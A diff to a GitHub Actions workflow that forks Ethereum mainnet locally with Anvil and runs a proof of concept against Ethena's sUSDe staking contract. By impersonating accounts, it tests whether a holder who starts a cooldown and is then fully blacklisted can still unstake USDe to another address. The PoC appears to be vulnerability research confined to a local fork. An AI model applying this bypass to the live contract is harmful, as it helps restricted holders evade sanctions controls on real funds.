@@ -3,8 +3,7 @@ name: Fork Validation Lab
 on:
   workflow_dispatch:
   push:
-    branches:
-      - main
+    branches: [main]
 
 permissions:
   contents: read
@@ -15,27 +14,23 @@ jobs:
     timeout-minutes: 10
 
     steps:
-      - name: Install Foundry
-        uses: foundry-rs/foundry-toolchain@v1
+      - uses: foundry-rs/foundry-toolchain@v1
 
       - name: Test Ethereum RPC
         env:
           ETH_RPC_URL: ${{ secrets.ETH_RPC_URL }}
         run: |
           set -euo pipefail
+
           test -n "$ETH_RPC_URL"
 
-          echo "RPC_SECRET_PRESENT=YES"
-          forge --version
-          cast --version
-          anvil --version
-
           MAIN_CHAIN_ID="$(cast chain-id --rpc-url "$ETH_RPC_URL")"
-          echo "MAINNET_CHAIN_ID=$MAIN_CHAIN_ID"
-          test "$MAIN_CHAIN_ID" = "1"
-
           MAIN_BLOCK="$(cast block-number --rpc-url "$ETH_RPC_URL")"
+
+          echo "MAINNET_CHAIN_ID=$MAIN_CHAIN_ID"
           echo "MAINNET_BLOCK=$MAIN_BLOCK"
+
+          test "$MAIN_CHAIN_ID" = "1"
           test "$MAIN_BLOCK" -gt 0
 
           echo "RPC_PREFLIGHT=PASS"
@@ -46,8 +41,7 @@ jobs:
     timeout-minutes: 20
 
     steps:
-      - name: Install Foundry
-        uses: foundry-rs/foundry-toolchain@v1
+      - uses: foundry-rs/foundry-toolchain@v1
 
       - name: Start isolated Ethereum Mainnet Fork
         env:
@@ -78,6 +72,7 @@ jobs:
               READY=1
               break
             fi
+
             sleep 1
           done
 
@@ -86,13 +81,13 @@ jobs:
           LOCAL_CHAIN_ID="$(cast chain-id \
             --rpc-url http://127.0.0.1:8545)"
 
-          echo "LOCAL_CHAIN_ID=$LOCAL_CHAIN_ID"
-          test "$LOCAL_CHAIN_ID" = "31337"
-
           FORK_BLOCK="$(cast block-number \
             --rpc-url http://127.0.0.1:8545)"
 
+          echo "LOCAL_CHAIN_ID=$LOCAL_CHAIN_ID"
           echo "FORK_BLOCK=$FORK_BLOCK"
+
+          test "$LOCAL_CHAIN_ID" = "31337"
           test "$FORK_BLOCK" -gt 0
 
           echo "ANVIL_FORK=PASS"
@@ -131,14 +126,252 @@ jobs:
         run: |
           set -euo pipefail
 
+          RPC="http://127.0.0.1:8545"
+
           USDE="0x4c9EDD5852cd905f086C759E8383e09bff1E68B3"
           SUSDE="0x9D39A5DE30e57443BfF2A8307A4256c8797A3497"
 
-          echo "USDE_CODE_BYTES=$(cast code "$USDE" \
-            --rpc-url http://127.0.0.1:8545 | wc -c)"
+          USDE_CODE="$(cast code "$USDE" --rpc-url "$RPC")"
+          SUSDE_CODE="$(cast code "$SUSDE" --rpc-url "$RPC")"
 
-          echo "SUSDE_CODE_BYTES=$(cast code "$SUSDE" \
-            --rpc-url http://127.0.0.1:8545 | wc -c)"
+          USDE_SUPPLY="$(cast call \
+            "$USDE" \
+            "totalSupply()(uint256)" \
+            --rpc-url "$RPC")"
 
-          echo "USDE_TOTAL_SUPPLY=$(cast call "$USDE" \
-            "
+          SUSDE_SUPPLY="$(cast call \
+            "$SUSDE" \
+            "totalSupply()(uint256)" \
+            --rpc-url "$RPC")"
+
+          SUSDE_ASSET="$(cast call \
+            "$SUSDE" \
+            "asset()(address)" \
+            --rpc-url "$RPC")"
+
+          echo "USDE_CODE_BYTES=${#USDE_CODE}"
+          echo "SUSDE_CODE_BYTES=${#SUSDE_CODE}"
+          echo "USDE_TOTAL_SUPPLY=$USDE_SUPPLY"
+          echo "SUSDE_TOTAL_SUPPLY=$SUSDE_SUPPLY"
+          echo "SUSDE_ASSET=$SUSDE_ASSET"
+
+          test -n "$USDE_CODE"
+          test -n "$SUSDE_CODE"
+
+          echo "ETHENA_FORK_INSPECTION=PASS"
+
+      - name: PoC - cooldown then FULL blacklist then unstake
+        run: |
+          set -euo pipefail
+
+          RPC="http://127.0.0.1:8545"
+
+          SUSDE="0x9D39A5DE30e57443BfF2A8307A4256c8797A3497"
+          USDE="0x4c9EDD5852cd905f086C759E8383e09bff1E68B3"
+
+          HOLDER="0xA469b399df1c7b4bd8569048d889f131329dffa1"
+
+          RECEIVER="0x70997970C51812dc3A010C7d01b50e0d17dc79C8"
+
+          echo "===== HOLDER CHECK ====="
+
+          HOLDER_CODE="$(cast code \
+            "$HOLDER" \
+            --rpc-url "$RPC")"
+
+          echo "HOLDER_CODE=$HOLDER_CODE"
+
+          test "$HOLDER_CODE" = "0x"
+
+          echo "HOLDER_IS_EOA=YES"
+
+          BAL="$(cast call \
+            "$SUSDE" \
+            "balanceOf(address)(uint256)" \
+            "$HOLDER" \
+            --rpc-url "$RPC" | awk '{print $1}')"
+
+          echo "HOLDER_SUSDE_BALANCE=$BAL"
+
+          test "$BAL" -ge 1000000000000000000
+
+          echo "===== STEP 1: COOLDOWN ====="
+
+          cast rpc anvil_setBalance \
+            "$HOLDER" \
+            0x56BC75E2D63100000
+
+          cast rpc anvil_impersonateAccount \
+            "$HOLDER"
+
+          cast send \
+            "$SUSDE" \
+            "cooldownShares(uint256)" \
+            1000000000000000000 \
+            --rpc-url "$RPC" \
+            --from "$HOLDER" \
+            --unlocked
+
+          COOLDOWN="$(cast call \
+            "$SUSDE" \
+            "cooldownDuration()(uint256)" \
+            --rpc-url "$RPC" | awk '{print $1}')"
+
+          echo "COOLDOWN_DURATION=$COOLDOWN"
+
+          test "$COOLDOWN" -ge 0
+
+          cast rpc evm_increaseTime \
+            $((COOLDOWN + 1))
+
+          cast rpc evm_mine
+
+          echo "COOLDOWN_EXPIRED=YES"
+
+          echo "===== ADMIN DISCOVERY ====="
+
+          OWNER="$(cast call \
+            "$SUSDE" \
+            "owner()(address)" \
+            --rpc-url "$RPC")"
+
+          echo "OWNER=$OWNER"
+
+          test "$OWNER" != "0x0000000000000000000000000000000000000000"
+
+          cast rpc anvil_setBalance \
+            "$OWNER" \
+            0x56BC75E2D63100000
+
+          cast rpc anvil_impersonateAccount \
+            "$OWNER"
+
+          DEFAULT_ADMIN="0x0000000000000000000000000000000000000000000000000000000000000000"
+
+          ADMIN_OK="$(cast call \
+            "$SUSDE" \
+            "hasRole(bytes32,address)(bool)" \
+            "$DEFAULT_ADMIN" \
+            "$OWNER" \
+            --rpc-url "$RPC")"
+
+          echo "OWNER_DEFAULT_ADMIN=$ADMIN_OK"
+
+          test "$ADMIN_OK" = "true"
+
+          BLACKLIST_ROLE="$(cast keccak \
+            "BLACKLIST_MANAGER_ROLE")"
+
+          HAS_BLACKLIST_ROLE="$(cast call \
+            "$SUSDE" \
+            "hasRole(bytes32,address)(bool)" \
+            "$BLACKLIST_ROLE" \
+            "$OWNER" \
+            --rpc-url "$RPC")"
+
+          echo "OWNER_BLACKLIST_MANAGER=$HAS_BLACKLIST_ROLE"
+
+          if [ "$HAS_BLACKLIST_ROLE" != "true" ]; then
+
+            cast send \
+              "$SUSDE" \
+              "grantRole(bytes32,address)" \
+              "$BLACKLIST_ROLE" \
+              "$OWNER" \
+              --rpc-url "$RPC" \
+              --from "$OWNER" \
+              --unlocked
+
+          fi
+
+          echo "BLACKLIST_MANAGER_READY=YES"
+
+          echo "===== STEP 2: FULL BLACKLIST ====="
+
+          cast send \
+            "$SUSDE" \
+            "addToBlacklist(address,bool)" \
+            "$HOLDER" \
+            true \
+            --rpc-url "$RPC" \
+            --from "$OWNER" \
+            --unlocked
+
+          FULL_ROLE="$(cast keccak \
+            "FULL_RESTRICTED_STAKER_ROLE")"
+
+          FULL_OK="$(cast call \
+            "$SUSDE" \
+            "hasRole(bytes32,address)(bool)" \
+            "$FULL_ROLE" \
+            "$HOLDER" \
+            --rpc-url "$RPC")"
+
+          echo "HOLDER_FULL_RESTRICTED=$FULL_OK"
+
+          test "$FULL_OK" = "true"
+
+          echo "FULL_BLACKLIST_CONFIRMED=YES"
+
+          echo "===== STEP 3: UNSTAKE ====="
+
+          BEFORE="$(cast call \
+            "$USDE" \
+            "balanceOf(address)(uint256)" \
+            "$RECEIVER" \
+            --rpc-url "$RPC" | awk '{print $1}')"
+
+          echo "USDE_BEFORE=$BEFORE"
+
+          cast rpc anvil_impersonateAccount \
+            "$HOLDER"
+
+          cast send \
+            "$SUSDE" \
+            "unstake(address)" \
+            "$RECEIVER" \
+            --rpc-url "$RPC" \
+            --from "$HOLDER" \
+            --unlocked
+
+          AFTER="$(cast call \
+            "$USDE" \
+            "balanceOf(address)(uint256)" \
+            "$RECEIVER" \
+            --rpc-url "$RPC" | awk '{print $1}')"
+
+          echo "USDE_AFTER=$AFTER"
+
+          DELTA=$((AFTER - BEFORE))
+
+          echo "USDE_RECEIVED=$DELTA"
+
+          if [ "$DELTA" -gt 0 ]; then
+            echo "COOLDOWN_BLACKLIST_UNSTAKE_BYPASS=CONFIRMED"
+          else
+            echo "COOLDOWN_BLACKLIST_UNSTAKE_BYPASS=NOT_CONFIRMED"
+            exit 1
+          fi
+
+      - name: Final fork evidence
+        if: always()
+        run: |
+          echo "EXECUTION_MODE=LOCAL_FORK_ONLY"
+          echo "LIVE_TRADING=PROHIBITED"
+          echo "MAINNET_TRANSACTIONS=NONE"
+
+      - name: Stop isolated fork
+        if: always()
+        run: |
+          set +e
+
+          if [ -f anvil.pid ]; then
+            kill "$(cat anvil.pid)" 2>/dev/null || true
+          fi
+
+          if [ -f anvil.log ]; then
+            echo "===== FINAL ANVIL LOG ====="
+            tail -n 80 anvil.log || true
+          fi
+
+          echo "LOCAL_FORK_STOPPED=YES"
